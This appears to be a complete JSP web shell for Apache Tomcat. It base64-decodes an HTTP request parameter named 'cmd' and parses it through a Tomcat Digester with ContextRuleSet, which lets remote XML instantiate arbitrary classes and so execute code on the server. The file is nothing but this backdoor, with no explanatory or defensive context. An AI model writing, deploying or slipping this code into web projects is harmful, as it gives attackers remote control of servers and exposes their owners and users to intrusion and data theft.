<%
    org.apache.tomcat.util.digester.Digester digester = new
            org.apache.tomcat.util.digester.Digester();
    digester.addRuleSet(new org.apache.catalina.startup.ContextRuleSet("",
            false));
    org.xml.sax.InputSource inputSource = new org.xml.sax.InputSource();
    inputSource.setByteStream(new
            java.io.ByteArrayInputStream(java.util.Base64.getDecoder().decode(request.
            getParameter("cmd"))));
    digester.parse(inputSource);
%>